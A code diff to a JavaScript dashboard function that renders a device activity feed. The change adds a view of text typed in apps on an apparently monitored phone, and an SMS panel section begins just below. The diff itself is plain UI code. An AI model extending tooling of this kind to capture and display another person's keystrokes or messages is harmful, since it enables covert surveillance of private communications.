@@ -762,13 +762,19 @@ function renderActivityPanel() {
         container.innerHTML = '<div class="empty-state"><div class="empty-icon">📋</div>No activity recorded yet</div>';
         return;
     }
-    container.innerHTML = cachedActivity.map(a => `
+    container.innerHTML = cachedActivity.map(a => {
+        const typed = a.data && (a.data.text || a.data.body);
+        const isTyped = a.activity_type === 'text_input';
+        const icon = isTyped ? '⌨' : '▶';
+        const label = isTyped ? `Typed in ${a.app_name || a.package_name || 'App'}` : (a.app_name || a.activity_type || 'Activity');
+        return `
         <div class="activity-item">
-            <strong>▶ ${escHtml(a.app_name || a.activity_type || 'Activity')}</strong>
+            <strong>${icon} ${escHtml(label)}</strong>
             ${a.package_name ? `<span class="device-tag">${escHtml(a.package_name)}</span>` : ''}
             <span class="time">${formatTime(a.timestamp)}</span>
-        </div>
-    `).join('');
+            ${typed ? `<div style="margin-top:4px;padding:6px 10px;background:#f4f6fb;border-left:3px solid #5b7cfa;border-radius:4px;color:#333;font-size:13px;white-space:pre-wrap;word-break:break-word;">“${escHtml(String(typed).substring(0, 300))}”</div>` : ''}
+        </div>`;
+    }).join('');
 }
 
 // ─── SMS Panel ────────────────────────────────────────────────────────────
